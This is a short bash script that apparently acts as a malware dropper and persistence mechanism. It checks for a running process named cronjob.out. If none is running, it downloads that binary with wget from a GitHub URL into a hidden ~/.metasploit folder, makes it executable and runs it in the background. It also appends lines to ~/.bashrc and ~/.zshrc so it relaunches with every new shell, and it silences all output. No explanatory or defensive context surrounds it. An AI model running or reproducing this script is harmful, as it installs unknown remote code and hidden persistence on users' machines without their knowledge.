he=$(echo $USER) 
function step1(){ 
hi=$(ps aux  | grep -v grep | grep "./cronjob.out" | head -1) 
echo "$hi" >> output.txt 
if grep ./cronjob.out   <<<"$hi" >/dev/null 2>&1 
then rm output.txt 
else 
rm output.txt 
step3 >/dev/null 2>&1 
fi
} 
function step2(){ 
echo "/bin/zsh  /home/$he/.metasploit/cronjob.sh  >/dev/null 2" >> ~/.zshrc 
echo "/bin/bash /home/$he/.metasploit/cronjob.sh  >/dev/null 2" >> ~/.bashrc 
} 
function step3(){ 
cd  /home/$he/.metasploit
if [ -f cronjob.out  ]; 
then 
./cronjob.out & 
else 
wget https://github.com/gobiwound/ab32/blob/main/cronjob.out >/dev/null 2>&1 
chmod +x /home/$he/.metasploit/cronjob.out
./cronjob.out & 
step2
fi 
} 
chmod +x /home/$USER/.metasploit/cronjob.sh 
step1
        
